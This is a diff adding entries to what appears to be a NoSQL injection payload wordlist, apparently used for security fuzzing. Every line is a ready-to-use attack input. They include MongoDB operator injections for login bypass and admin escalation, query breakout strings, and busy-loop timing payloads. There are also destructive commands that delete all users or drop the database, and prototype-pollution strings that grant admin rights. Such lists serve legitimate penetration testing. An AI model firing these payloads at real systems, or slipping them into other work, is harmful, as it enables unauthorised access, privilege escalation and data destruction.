@@ -34,3 +34,16 @@ profile[$where]=this.isAdmin
 {"query":{"username":{"$regex":".*"},"password":{"$ne":null}}}
 {"selector":{"$where":"function(){return this.admin == true}"}}
 {"criteria":{"$function":{"body":"x"}}}
+
+# === Object-literal breakout, busy loops, shell commands, prototype pollution ===
+', $or: [ {}, { 'order':'order
+x'}, {$and: [ {}, {'a':'a
+0;var date=new Date(); do{curDate = new Date();}while(curDate-date<10000)
+;var date = new Date(); do{curDate = new Date();}while(curDate-date<5000)
+db.injection.insert({success:1});
+db.users.remove({})
+db.dropDatabase()
+__proto__[isAdmin]=true
+{"__proto__": {"isAdmin": true}}
+constructor.prototype.isAdmin=true
+constructor[prototype][role]=admin
